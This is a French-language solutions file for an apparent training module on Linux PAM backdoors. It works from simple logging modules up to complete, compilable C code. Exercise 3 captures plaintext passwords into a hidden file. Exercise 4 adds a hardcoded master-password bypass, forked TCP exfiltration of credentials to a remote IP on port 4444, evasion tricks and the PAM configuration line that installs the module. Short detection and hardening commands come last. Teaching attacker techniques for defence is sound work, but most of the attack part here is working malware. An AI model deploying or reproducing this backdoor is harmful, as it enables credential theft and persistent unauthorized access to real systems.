# Solutions - PAM Backdoor

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre les mécanismes de sécurité PAM et leurs vulnérabilités. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre la structure d'un module PAM

### Solution

```c
/*
 * Compilation :
 * gcc -fPIC -c pam_example.c
 * gcc -shared -o pam_example.so pam_example.o -lpam
 */

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <syslog.h>

/*
 * Fonction d'authentification PAM
 * Cette fonction est appelée par le système PAM lors de l'authentification
 *
 * pamh : handle PAM
 * flags : drapeaux de contrôle
 * argc : nombre d'arguments
 * argv : tableau d'arguments
 */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    // Log l'événement d'authentification dans syslog
    syslog(LOG_INFO, "[PAM Example] Fonction d'authentification appelée");

    // Retourne succès - permet l'authentification
    // PAM_SUCCESS indique que l'authentification a réussi
    return PAM_SUCCESS;
}

/*
 * Fonction de gestion des credentials
 * Appelée pour établir les credentials de l'utilisateur
 */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    // Log l'événement
    syslog(LOG_INFO, "[PAM Example] Fonction setcred appelée");

    // Retourne succès
    return PAM_SUCCESS;
}
```

**Explications** :
- Un module PAM est une bibliothèque partagée (.so)
- Il doit implémenter des fonctions spécifiques comme `pam_sm_authenticate`
- Ces fonctions sont appelées par le système lors de l'authentification
- Le retour `PAM_SUCCESS` indique une authentification réussie

---

## Exercice 2 : Modification (Facile)

**Objectif** : Créer un module PAM avec logging des tentatives d'authentification

### Solution

```c
/*
 * Module PAM avec logging détaillé
 *
 * Installation :
 * 1. Compiler : gcc -fPIC -c pam_logger.c && gcc -shared -o pam_logger.so pam_logger.o -lpam
 * 2. Copier : sudo cp pam_logger.so /lib/x86_64-linux-gnu/security/
 * 3. Configurer dans /etc/pam.d/common-auth
 */

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>
#include <time.h>

// Fichier de log personnalisé
#define LOG_FILE "/var/log/pam_custom.log"

/*
 * Fonction pour écrire dans un fichier de log personnalisé
 */
void write_log(const char *username, const char *message)
{
    FILE *f = fopen(LOG_FILE, "a");
    if (f != NULL) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        // Retire le \n de ctime
        timestamp[strlen(timestamp) - 1] = '\0';

        fprintf(f, "[%s] User: %s - %s\n", timestamp, username, message);
        fclose(f);
    }
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    const char *username = NULL;
    int retval;

    // Récupère le nom d'utilisateur depuis PAM
    retval = pam_get_user(pamh, &username, NULL);

    if (retval != PAM_SUCCESS) {
        syslog(LOG_ERR, "[PAM Logger] Impossible de récupérer le username");
        return retval;
    }

    // Log la tentative d'authentification
    write_log(username, "Tentative d'authentification");
    syslog(LOG_INFO, "[PAM Logger] Tentative d'auth pour: %s", username);

    // Passe au module suivant dans la chaîne PAM
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_SUCCESS;
}
```

**Explications** :
- `pam_get_user()` permet de récupérer le nom d'utilisateur
- On peut logger les informations dans un fichier personnalisé
- Le module s'insère dans la chaîne PAM et peut observer toutes les tentatives
- Utile pour l'audit et la détection d'intrusion

---

## Exercice 3 : Création (Moyen)

**Objectif** : Module PAM avec capture des mots de passe

### Solution

**ATTENTION** : Cette solution est fournie uniquement à des fins éducatives. La capture de mots de passe sans autorisation est illégale.

```c
/*
 * Module PAM de capture de credentials
 *
 * Ce module démontre comment un module PAM malveillant pourrait
 * capturer les credentials. À utiliser UNIQUEMENT en environnement de test.
 */

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define CRED_LOG "/tmp/.hidden_creds.log"

/*
 * Fonction de conversation pour récupérer le mot de passe
 * Cette fonction est appelée par PAM pour interagir avec l'utilisateur
 */
static int conversation(int num_msg, const struct pam_message **msg,
                       struct pam_response **resp, void *appdata_ptr)
{
    return PAM_SUCCESS;
}

/*
 * Enregistre les credentials dans un fichier caché
 */
void log_credentials(const char *username, const char *password)
{
    FILE *f = fopen(CRED_LOG, "a");
    if (f != NULL) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0';

        // Écrit les credentials dans le fichier
        fprintf(f, "[%s] %s:%s\n", timestamp, username, password);
        fclose(f);

        // Cache le fichier (permissions restrictives)
        chmod(CRED_LOG, 0600);
    }
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    const char *username = NULL;
    const char *password = NULL;
    int retval;

    // Récupère le nom d'utilisateur
    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    // Récupère le mot de passe via PAM
    // PAM_AUTHTOK contient le token d'authentification (mot de passe)
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (retval == PAM_SUCCESS && password != NULL) {
        // LOG les credentials (ACTION MALVEILLANTE)
        log_credentials(username, password);

        // Log dans syslog de manière discrète
        syslog(LOG_INFO, "[PAM] Authentication check for %s", username);
    }

    // Important : retourner PAM_SUCCESS pour ne pas bloquer l'auth
    // et rester discret
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_SUCCESS;
}

/*
 * Fonction d'ouverture de session
 * Peut être utilisée pour exécuter des commandes lors de la connexion
 */
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    const char *username = NULL;
    pam_get_user(pamh, &username, NULL);

    syslog(LOG_INFO, "[PAM] Session opened for %s", username);

    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv)
{
    return PAM_SUCCESS;
}
```

**Explications** :
- `pam_get_authtok()` permet de récupérer le mot de passe en clair
- Le module reste discret en retournant toujours `PAM_SUCCESS`
- Les credentials sont stockés dans un fichier caché
- C'est exactement comme cela qu'un backdoor PAM fonctionne

**Détection** :
- Surveiller les fichiers .so dans `/lib/*/security/`
- Vérifier l'intégrité des modules PAM (checksums)
- Auditer les modifications de `/etc/pam.d/`
- Utiliser des outils comme `aide` ou `tripwire`

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : Module PAM avec backdoor d'authentification et exfiltration

### Solution

```c
/*
 * Module PAM Backdoor Avancé
 *
 * Fonctionnalités :
 * - Mot de passe master pour bypass
 * - Capture de credentials
 * - Exfiltration réseau (optionnelle)
 * - Techniques d'évasion
 */

#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Configuration du backdoor
#define MASTER_PASSWORD "Sup3rS3cr3t!2024"
#define CRED_LOG "/var/tmp/.system.cache"
#define EXFIL_IP "192.168.1.100"
#define EXFIL_PORT 4444

/*
 * Fonction pour exfiltrer les credentials via réseau
 * Envoie les données à un serveur distant
 */
int exfiltrate_credentials(const char *username, const char *password)
{
    int sock;
    struct sockaddr_in server;
    char message[512];

    // Crée le socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return -1;
    }

    // Configure l'adresse du serveur
    server.sin_family = AF_INET;
    server.sin_port = htons(EXFIL_PORT);
    inet_pton(AF_INET, EXFIL_IP, &server.sin_addr);

    // Tente la connexion (timeout rapide pour éviter de ralentir l'auth)
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        // Prépare le message
        snprintf(message, sizeof(message), "USER:%s PASS:%s\n",
                 username, password);

        // Envoie les données
        send(sock, message, strlen(message), 0);
    }

    close(sock);
    return 0;
}

/*
 * Enregistre localement les credentials
 */
void log_credentials(const char *username, const char *password)
{
    FILE *f = fopen(CRED_LOG, "a");
    if (f != NULL) {
        time_t now = time(NULL);
        fprintf(f, "%ld|%s|%s\n", now, username, password);
        fclose(f);
        chmod(CRED_LOG, 0600);
    }
}

/*
 * Vérifie si le mot de passe est le master password
 */
int is_master_password(const char *password)
{
    if (password == NULL) {
        return 0;
    }
    return (strcmp(password, MASTER_PASSWORD) == 0);
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    const char *username = NULL;
    const char *password = NULL;
    int retval;

    // Récupère les credentials
    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    // Vérifie si c'est le master password
    if (is_master_password(password)) {
        // BACKDOOR ACTIVÉ
        syslog(LOG_INFO, "[PAM] Authentication successful for %s", username);
        return PAM_SUCCESS;  // Bypass complet de l'authentification
    }

    // Log les credentials
    if (password != NULL) {
        log_credentials(username, password);

        // Tente l'exfiltration en arrière-plan (fork pour ne pas bloquer)
        pid_t pid = fork();
        if (pid == 0) {
            // Processus enfant - exfiltration
            exfiltrate_credentials(username, password);
            exit(0);
        }
    }

    // Continue normalement pour ne pas éveiller les soupçons
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                int argc, const char **argv)
{
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv)
{
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv)
{
    return PAM_SUCCESS;
}
```

**Configuration PAM** :
```bash
# Ajouter dans /etc/pam.d/common-auth (en premier pour capturer tous)
auth    optional    pam_backdoor.so

# Le module est "optional" pour ne pas bloquer l'auth en cas d'erreur
```

**Explications avancées** :

1. **Backdoor d'authentification** :
   - Mot de passe master qui bypass toute vérification
   - Permet l'accès même avec un mauvais mot de passe

2. **Capture de credentials** :
   - Tous les mots de passe sont loggés
   - Stockage local dans un fichier caché

3. **Exfiltration réseau** :
   - Envoie les credentials à un serveur distant
   - Utilise fork() pour ne pas bloquer l'authentification
   - Timeout court pour rester discret

4. **Techniques d'évasion** :
   - Module marqué "optional" dans la config PAM
   - Logs normaux dans syslog
   - Fichier de log caché avec nom légitime
   - Pas d'échec d'authentification visible

**Contre-mesures** :

1. **Détection** :
   ```bash
   # Vérifier les modules PAM
   ls -la /lib/x86_64-linux-gnu/security/

   # Vérifier l'intégrité
   rpm -V pam  # Sur Red Hat/CentOS
   dpkg --verify libpam-modules  # Sur Debian/Ubuntu

   # Chercher des connexions réseau suspectes
   lsof -i -P -n | grep pam
   ```

2. **Prévention** :
   - Surveillance des modifications dans `/etc/pam.d/`
   - Vérification d'intégrité des .so (AIDE, Tripwire)
   - SELinux/AppArmor pour limiter les capacités des modules
   - Audit régulier des modules PAM installés

3. **Hardening** :
   ```bash
   # Protéger les fichiers de config PAM
   chattr +i /etc/pam.d/*

   # Surveiller avec auditd
   auditctl -w /etc/pam.d/ -p wa -k pam_config
   auditctl -w /lib/x86_64-linux-gnu/security/ -p wa -k pam_modules
   ```

---

## Points clés à retenir

1. **Architecture PAM** :
   - Modules pluggables pour l'authentification
   - Chaîne de modules dans `/etc/pam.d/`
   - Chaque module peut observer/modifier le processus d'auth

2. **Vecteurs d'attaque** :
   - Injection de module malveillant
   - Modification de module existant
   - Capture de credentials en clair

3. **Persistance** :
   - Module PAM = persistance au niveau système
   - Activé à chaque authentification
   - Difficile à détecter sans outils d'intégrité

4. **Détection** :
   - Vérification d'intégrité des fichiers
   - Surveillance des modifications de configuration
   - Analyse des comportements réseau anormaux

## Ressources complémentaires

- Linux PAM Documentation: http://www.linux-pam.org/
- PAM Module Writing Guide
- Audit de sécurité PAM avec AIDE/Tripwire
- Red Team : Persistence via PAM
